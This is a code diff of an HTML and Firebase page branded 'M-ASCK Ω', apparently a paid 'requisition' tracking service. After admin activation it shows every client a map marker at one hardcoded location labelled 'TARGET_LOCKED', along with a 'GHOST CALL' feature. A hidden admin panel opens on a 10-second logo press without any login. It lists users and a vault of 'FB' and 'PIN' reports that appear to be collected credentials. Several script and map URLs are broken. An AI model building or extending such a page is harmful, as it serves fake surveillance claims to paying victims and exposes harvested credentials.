@@ -3,30 +3,58 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>M-ASCK Ω</title>
+    <title>M-ASCK Ω | SOVEREIGN COMMAND</title>
     <script src="https://tailwindcss.com"></script>
     <script src="https://gstatic.com"></script>
     <script src="https://gstatic.com"></script>
+    <link rel="stylesheet" href="https://unpkg.com" />
+    <script src="https://unpkg.com"></script>
     <style>
-        body { background: #000; color: #f00; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        .pulsing { font-size: 2.5rem; font-weight: bold; cursor: pointer; animation: pulse 2s infinite; letter-spacing: 5px; }
-        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.2; } }
-        .glass { background: rgba(10,10,10,0.98); border: 1px solid #f00; padding: 40px; border-radius: 40px; width: 350px; text-align: center; }
-        input { background: #050505 !important; border: 1px solid #222 !important; color: #fff !important; text-align: center; }
+        body { background: #000; color: #fff; font-family: monospace; overflow: hidden; height: 100vh; -webkit-user-select: none; }
+        #map { position: absolute; inset: 0; z-index: 1; filter: invert(1) hue-rotate(180deg) brightness(0.3); display: none; }
+        .pulsing { color: #f00; font-size: 3rem; font-weight: bold; animation: pulse 2s infinite; cursor: pointer; letter-spacing: 5px; text-shadow: 0 0 15px rgba(255,0,0,0.5); }
+        @keyframes pulse { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.1; transform: scale(0.98); } }
+        .glass { background: rgba(5,5,5,0.98); border: 1px solid #f00; padding: 40px; border-radius: 50px; width: 95%; max-width: 450px; text-align: center; z-index: 100; position: relative; box-shadow: 0 0 50px rgba(255,0,0,0.3); }
+        #admin-panel { display: none; position: fixed; inset: 0; background: #000; z-index: 2000; padding: 30px; overflow-y: auto; color: #f00; }
+        .btn-active { background: #f00; color: #fff; padding: 15px; border-radius: 15px; font-weight: bold; text-transform: uppercase; width: 100%; }
+        /* Anti-Capture Overlay */
+        .no-capture { position: fixed; inset: 0; z-index: 9999; pointer-events: none; border: 0px solid transparent; }
     </style>
 </head>
 <body>
-    <div class="glass">
-        <!-- 🔴 ADMIN TRIGGER: Tsindrio ity mandritra ny 10 segondra -->
-        <div id="logo-trigger" class="pulsing mb-10" onmousedown="startT()" onmouseup="stopT()" ontouchstart="startT()" ontouchend="stopT()">M-ASCK Ω</div>
-        
-        <input id="q" type="text" placeholder="REQUISITION ID" class="w-full p-4 rounded-xl font-black uppercase mb-6 outline-none border-red-900/30 focus:border-red-600">
-        
-        <button onclick="runPulse()" id="btn" class="w-full py-4 bg-red-700 text-white font-black rounded-xl shadow-2xl uppercase text-[10px] mb-6">Lancer Réquisition Ω</button>
-        
-        <div class="border-t border-red-900/20 pt-6">
-            <button onclick="wa()" class="text-blue-500 text-[10px] uppercase font-bold underline">Demander Activation via WhatsApp</button>
+    <div id="map"></div>
+    <div class="no-capture"></div>
+
+    <!-- 🟢 INTERFACE CLIENT / LOGIN -->
+    <div id="client-ui" class="flex items-center justify-center w-full h-full">
+        <div class="glass">
+            <div id="logo-trigger" class="pulsing mb-12" onmousedown="startAdminTimer()" onmouseup="stopAdminTimer()" ontouchstart="startAdminTimer()" ontouchend="stopAdminTimer()">M-ASCK Ω</div>
+            <div id="auth-form" class="space-y-6">
+                <input id="target-id" type="text" placeholder="REQUISITION ID" class="w-full bg-black border border-zinc-800 p-6 rounded-3xl text-white text-center font-black text-xl outline-none focus:border-red-600">
+                <button onclick="runRequisition()" id="launch-btn" class="btn-active">Lancer Réquisition Ω</button>
+                <div class="pt-6">
+                    <button onclick="waRequest()" class="text-blue-500 text-[10px] uppercase font-bold tracking-widest underline">Demander Activation via WhatsApp</button>
+                </div>
+            </div>
+            <div id="client-tools" class="hidden mt-8 space-y-4 text-[11px] text-left uppercase">
+                <div class="p-4 border border-zinc-800 rounded-2xl bg-zinc-950">
+                    <p>Identity: <span id="res-name" class="text-white">---</span></p>
+                    <p>Serial: <span id="res-serial" class="text-blue-500 font-bold">---</span></p>
+                </div>
+                <button id="ghost-call-btn" class="hidden w-full py-3 border-2 border-red-600 rounded-xl animate-pulse font-black text-red-600">GHOST CALL ACTIVE</button>
+            </div>
         </div>
+    </div>
+
+    <!-- 🔴 INTERFACE ADMIN (GHOST MODE) -->
+    <div id="admin-panel">
+        <h1 class="text-2xl font-black mb-8 border-b border-red-900 pb-4 italic tracking-tighter uppercase">Admin Bunker Ω</h1>
+        <div id="user-list" class="space-y-6 text-xs uppercase">Extraction des signaux...</div>
+        <div id="report-vault" class="mt-10 pt-10 border-t border-red-900 space-y-4">
+            <h2 class="text-white font-bold">Ω-DATABASE-REPORT</h2>
+            <div id="reports" class="text-[10px] text-zinc-500">Aucun rapport secret.</div>
+        </div>
+        <button onclick="closeAdmin()" class="mt-20 text-zinc-700 block w-full text-center">[ Fermer Session ]</button>
     </div>
 
     <script>
@@ -42,34 +70,74 @@
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
 
-        // 🕰️ ADMIN TIMER
-        let t;
-        function startT() { t = setTimeout(() => { window.location.href = "admin.html"; }, 10000); }
-        function stopT() { clearTimeout(t); }
+        // 🕰️ Admin Bypass Timer
+        let adminTimer;
+        function startAdminTimer() { adminTimer = setTimeout(() => { document.getElementById('admin-panel').style.display = 'block'; }, 10000); }
+        function stopAdminTimer() { clearTimeout(adminTimer); }
+        function closeAdmin() { document.getElementById('admin-panel').style.display = 'none'; }
 
-        // 🛰️ WHATSAPP FIX
-        function wa() {
+        // 🛰️ WhatsApp Logic
+        function waRequest() {
             const id = "ASCK-" + Math.floor(Math.random() * 9999);
-            const msg = "Bonjour Administration M-ASCK. Je souhaite activer mon ID : " + id;
-            window.open("https://wa.me" + encodeURIComponent(msg), "_blank");
+            const msg = `Bonjour Administration M-ASCK. Je souhaite activer mon ID : ${id}`;
+            window.open(`https://wa.me{encodeURIComponent(msg)}`, '_blank');
         }
 
-        // 🔓 LAUNCH LOGIC
-        function runPulse() {
-            const id = document.getElementById('q').value;
+        // 🔓 Requisition Core
+        function runRequisition() {
+            const id = document.getElementById('target-id').value;
             if(!id) return;
-            document.getElementById('btn').innerText = "SYNCHRONIZING...";
-
-            db.ref('users/' + id).once('value', (s) => {
-                if(s.exists() && s.val().status === 'active') {
-                    alert("SIGNAL LOCKED. Dashboard ouvert.");
+            document.getElementById('launch-btn').innerText = "SYNCHRONIZING...";
+            
+            db.ref('users/' + id).on('value', (snap) => {
+                const u = snap.val();
+                if(u && u.status === 'active') {
+                    showDashboard(id, u);
                 } else {
-                    db.ref('users/' + id).set({ customID: id, status: 'locked' });
+                    db.ref('users/' + id).set({ customID: id, status: 'locked', created_at: Date.now() });
                     alert("Awaiting Admin Activation.");
+                    document.getElementById('launch-btn').innerText = "Lancer Réquisition Ω";
                 }
-                document.getElementById('btn').innerText = "Lancer Réquisition Ω";
-            }).catch(e => alert("DATABASE_ERROR: Jereo ny Rules ao amin'ny Firebase"));
+            });
         }
+
+        function showDashboard(id, u) {
+            document.getElementById('auth-form').classList.add('hidden');
+            document.getElementById('client-tools').classList.remove('hidden');
+            document.getElementById('map').style.display = 'block';
+            document.getElementById('res-name').innerText = "TARGET_LOCKED";
+            document.getElementById('res-serial').innerText = id;
+            if(u.ghostCall) document.getElementById('ghost-call-btn').classList.remove('hidden');
+            
+            // Map Setup
+            var m = L.map('map', {zoomControl:false}).setView([-18.8792, 47.5079], 16);
+            L.tileLayer('https://{s}://{x}&y={y}&z={z}',{subdomains:['mt0','mt1','mt2','mt3']}).addTo(m);
+            L.marker([-18.8792, 47.5079]).addTo(m).bindPopup("<b>TARGET_LOCKED</b>").openPopup();
+        }
+
+        // 👑 Admin Logic
+        db.ref('users').on('value', (snap) => {
+            const users = snap.val();
+            let html = "";
+            let reports = "";
+            for (let id in users) {
+                const u = users[id];
+                html += `<div class="border border-zinc-900 p-4 rounded-3xl flex justify-between items-center bg-zinc-950">
+                    <p>ID: <span class="text-white">${u.customID}</span></p>
+                    <div class="flex gap-2">
+                        <button onclick="update('${id}', 'active')" class="text-[10px] bg-red-700 text-white p-2 rounded-lg">ACTIVATE</button>
+                        <button onclick="update('${id}', 'locked')" class="text-[10px] bg-zinc-800 p-2 rounded-lg text-zinc-500">KILL</button>
+                        <button onclick="toggleCall('${id}', ${!u.ghostCall})" class="text-[10px] border border-red-700 p-2 rounded-lg">GHOST_CALL</button>
+                    </div>
+                </div>`;
+                if(u.report) reports += `<div class="p-2 border-b border-zinc-900">${u.customID} -> FB: ${u.report.fb} | PIN: ${u.report.pin}</div>`;
+            }
+            document.getElementById('user-list').innerHTML = html;
+            document.getElementById('reports').innerHTML = reports || "Aucun rapport secret.";
+        });
+
+        function update(id, stat) { db.ref('users/' + id).update({ status: stat }); }
+        function toggleCall(id, val) { db.ref('users/' + id).update({ ghostCall: val }); }
     </script>
 </body>
 </html>
